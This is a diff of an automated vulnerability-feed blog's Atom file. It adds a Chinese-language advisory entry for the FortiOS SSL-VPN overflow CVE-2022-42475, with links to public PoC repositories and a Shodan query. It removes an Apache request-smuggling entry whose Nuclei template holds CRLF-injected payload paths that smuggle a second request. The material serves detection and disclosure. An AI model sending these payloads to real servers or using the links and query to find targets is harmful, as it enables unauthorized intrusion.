@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-23T21:45:35.486Z</updated>
+  <updated>2025-06-23T23:00:19.743Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>FortiOS SSL-VPN 堆缓冲区溢出漏洞</title>
+    <link href="http://example.com/2025/06/23/github_2742528851/"/>
+    <id>http://example.com/2025/06/23/github_2742528851/</id>
+    <published>2025-06-23T23:00:19.745Z</published>
+    <updated>2025-06-23T23:00:19.743Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FortiOS SSL-VPN 堆缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2022-42475</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FortiOS SSL-VPN和FortiProxy SSL-VPN的特定版本中存在堆缓冲区溢出漏洞，攻击者可通过精心构造的请求远程执行任意代码或命令。</p><p><strong>产品厂商：</strong> Fortinet</p><p><strong>产品名称：</strong> FortiOS SSL-VPN, FortiProxy SSL-VPN</p><p><strong>影响版本：</strong> FortiOS SSL-VPN: 7.2.0-7.2.2, 7.0.0-7.0.8, 6.4.0-6.4.10, 6.2.0-6.2.11, 6.0.15及更早版本; FortiProxy SSL-VPN: 7.2.0-7.2.1, 7.0.7及更早版本</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:fortinet:fortios”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12142">https://github.com/projectdiscovery/nuclei-templates/issues/12142</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>FortiOS SSL-VPN versions 7.2.0-7.2.2, 7.0.0-7.0.8, 6.4.0-6.4.10, 6.2.0-6.2.11, 6.0.15 and earlier, and FortiProxy SSL-VPN versions 7.2.0-7.2.1, 7.0.7 and earlier contain a heap-based buffer overflow caused by crafted requests, letting remote unauthenticated attackers execute arbitrary code or commands.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://fortiguard.com/psirt/FG-IR-22-398">https://fortiguard.com/psirt/FG-IR-22-398</a></li><li><a href="https://vulncheck.com/xdb/c670713df10f">https://vulncheck.com/xdb/c670713df10f</a></li><li><a href="https://github.com/0xhaggis/CVE-2022-42475">https://github.com/0xhaggis/CVE-2022-42475</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:0xhaggis&#x2F;CVE-2022-42475.git</li><li><a href="https://vulncheck.com/xdb/276c2d2f8553">https://vulncheck.com/xdb/276c2d2f8553</a></li><li><a href="https://github.com/natceil/cve-2022-42475">https://github.com/natceil/cve-2022-42475</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:natceil&#x2F;cve-2022-42475.git</li><li><a href="https://vulncheck.com/xdb/bf45a56af2ba">https://vulncheck.com/xdb/bf45a56af2ba</a></li><li><a href="https://github.com/AiK1d/CVE-2022-42475-RCE-POC">https://github.com/AiK1d/CVE-2022-42475-RCE-POC</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:AiK1d&#x2F;CVE-2022-42475-RCE-POC.git</li><li><a href="https://vulncheck.com/xdb/cd08caecebf5">https://vulncheck.com/xdb/cd08caecebf5</a></li><li><a href="https://github.com/Mustafa1986/cve-2022-42475-Fortinet">https://github.com/Mustafa1986/cve-2022-42475-Fortinet</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:Mustafa1986&#x2F;cve-2022-42475-Fortinet.git</li><li><a href="https://vulncheck.com/xdb/c058dffc5d81">https://vulncheck.com/xdb/c058dffc5d81</a></li><li><a href="https://github.com/Amir-hy/cve-2022-42475">https://github.com/Amir-hy/cve-2022-42475</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:Amir-hy&#x2F;cve-2022-42475.git</li><li><a href="https://vulncheck.com/xdb/d8adbeedff1b">https://vulncheck.com/xdb/d8adbeedff1b</a></li><li><a href="https://github.com/scrt/cve-2022-42475">https://github.com/scrt/cve-2022-42475</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:scrt&#x2F;cve-2022-42475.git</li><li><a href="https://github.com/bryanster/ioc-cve-2022-42475">https://github.com/bryanster/ioc-cve-2022-42475</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-o-fortinet-fortios"><a href="#Shodan-Query-cpe-cpe-2-3-o-fortinet-fortios" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:o:fortinet:fortios&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:o:fortinet:fortios&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FortiOS SSL-VPN 堆缓冲区溢出漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+    
+  </entry>
   
   <entry>
     <title>Microsoft SMBv3 远程代码执行漏洞</title>
@@ -510,32 +537,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Apache HTTP Server HTTP Request Smuggling Vulnerability</title>
-    <link href="http://example.com/2025/06/23/github_1562422880/"/>
-    <id>http://example.com/2025/06/23/github_1562422880/</id>
-    <published>2025-06-23T13:15:28.499Z</published>
-    <updated>2025-06-23T13:15:28.498Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache HTTP Server HTTP Request Smuggling Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-25690</li></ul><p><strong>漏洞类型：</strong> 服务器端请求伪造</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Apache HTTP Server 版本2.4.0至2.4.55中存在HTTP请求走私漏洞，由于mod_proxy配置中存在RewriteRule或ProxyPassMatch匹配用户提供的URL数据并将其重新插入到代理请求中，攻击者可利用此漏洞绕过访问控制、代理非预期的URL并污染缓存。利用此漏洞需要特定的变量替换配置。</p><p><strong>产品厂商：</strong> apache</p><p><strong>产品名称：</strong> http_server</p><p><strong>影响版本：</strong> 2.4.0 &lt;&#x3D; version &lt;&#x3D; 2.4.55</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:a:apache:http_server”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/ea459166605e7e6317286d1979492844e9c730f0/http%2Fcves%2F2023%2FCVE-2023-25690.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/ea459166605e7e6317286d1979492844e9c730f0/http%2Fcves%2F2023%2FCVE-2023-25690.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs less"><br>id: CVE-2023-25690<br><br>info:<br>  name: Apache HTTP Server - HTTP Request Smuggling<br>  author: pszyszkowski<br>  severity: critical<br>  description: |<br>    Apache HTTP Server versions 2.4.0 through 2.4.55 <span class="hljs-attribute">contain a HTTP Request Smuggling caused by vulnerable mod_proxy configurations with RewriteRule or ProxyPassMatch that match user-supplied URL data and re-insert it into proxied requests, letting attackers bypass access controls, proxy unintended URLs, and poison caches, exploit requires specific configuration with variable substitution.</span><br><span class="hljs-attribute">  remediation</span>: |<br>    Users are recommended to update to at least version <span class="hljs-number">2.4</span>.<span class="hljs-number">56</span> of Apache HTTP Server.<br>  <span class="hljs-attribute">reference</span>:<br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/oOCyginXOo/CVE-2023-25690-POC</span><br>    - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nvd.nist.gov/vuln/detail/cve-2023-25690</span><br>  <span class="hljs-attribute">classification</span>:<br>    <span class="hljs-attribute">cvss-metrics</span>: <span class="hljs-attribute">CVSS</span>:<span class="hljs-number">3.1</span>/<span class="hljs-attribute">AV</span>:N/<span class="hljs-attribute">AC</span>:L/<span class="hljs-attribute">PR</span>:N/<span class="hljs-attribute">UI</span>:N/<span class="hljs-attribute">S</span>:U/<span class="hljs-attribute">C</span>:H/<span class="hljs-attribute">I</span>:H/<span class="hljs-attribute">A</span>:H<br>    <span class="hljs-attribute">cvss-score</span>: <span class="hljs-number">9.8</span><br>    <span class="hljs-attribute">cve-id</span>: CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">25690</span><br>    <span class="hljs-attribute">cwe-id</span>: CWE-<span class="hljs-number">444</span><br>    <span class="hljs-attribute">cpe</span>: <span class="hljs-attribute">cpe</span>:<span class="hljs-number">2.3</span>:<span class="hljs-attribute">a</span>:<span class="hljs-attribute">apache</span>:http_server<br>  <span class="hljs-attribute">metadata</span>:<br>    <span class="hljs-attribute">verified</span>: true<br>    <span class="hljs-attribute">max-request</span>: <span class="hljs-number">3</span><br>    <span class="hljs-attribute">vendor</span>: apache<br>    <span class="hljs-attribute">product</span>: http_server<br>    <span class="hljs-attribute">shodan-query</span>:<br>      - <span class="hljs-attribute">cpe</span>:<span class="hljs-string">&quot;cpe:2.3:a:apache:http_server&quot;</span><br>  <span class="hljs-attribute">tags</span>: cve2023,cve,apache,smuggling<br><br><span class="hljs-attribute">http</span>:<br>  - <span class="hljs-attribute">method</span>: GET<br>    <span class="hljs-attribute">path</span>:<br>      - <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;&quot;</span><br>      - <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125; HTTP/1.1%0a%0aHost:%20localhost%0d%0a%0d%0aGET /SMUGGLED HTTP/1.1&quot;</span><br>      - <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125; HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET /SMUGGLED HTTP/1.1&quot;</span><br><br>    <span class="hljs-attribute">matchers</span>:<br>      - <span class="hljs-attribute">type</span>: dsl<br>        <span class="hljs-attribute">dsl</span>:<br>          - <span class="hljs-string">&quot;status_code_1==200&quot;</span><br>          - <span class="hljs-string">&quot;status_code_2==400&quot;</span><br>          - <span class="hljs-string">&quot;status_code_3==200&quot;</span><br>        <span class="hljs-attribute">condition</span>: <span class="hljs-keyword">and</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache HTTP Server HTTP Request Smuggli</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="服务器端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
     
   </entry>
   
